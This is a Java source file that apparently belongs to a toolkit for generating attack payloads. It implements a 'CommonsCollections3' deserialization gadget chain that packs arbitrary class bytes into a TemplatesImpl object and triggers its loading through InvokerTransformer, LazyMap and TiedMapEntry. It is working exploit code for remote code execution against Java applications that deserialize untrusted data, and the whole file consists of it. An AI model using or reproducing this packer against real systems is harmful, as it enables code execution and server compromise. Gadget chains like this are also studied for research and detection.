package com.reajason.javaweb.packer.deserialize.java;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.deserialize.JavaDeserializeGenerator;
import com.reajason.javaweb.packer.deserialize.TemplateUtils;
import com.reajason.javaweb.packer.deserialize.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import lombok.SneakyThrows;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;


/**
 * @author ReaJason
 * @since 2025/2/17
 */
public class CommonsCollections3Packer implements Packer {

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        TemplatesImpl templates = TemplateUtils.createTemplatesImpl(config.getClassBytes());

        InvokerTransformer invokerTransformer = new InvokerTransformer("toString", null, null);

        Map innerMap = new HashMap<>();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);

        Map expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "valueTest");
        outerMap.remove(templates);

        Reflections.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");
        return JavaDeserializeGenerator.generate(expMap);
    }
}
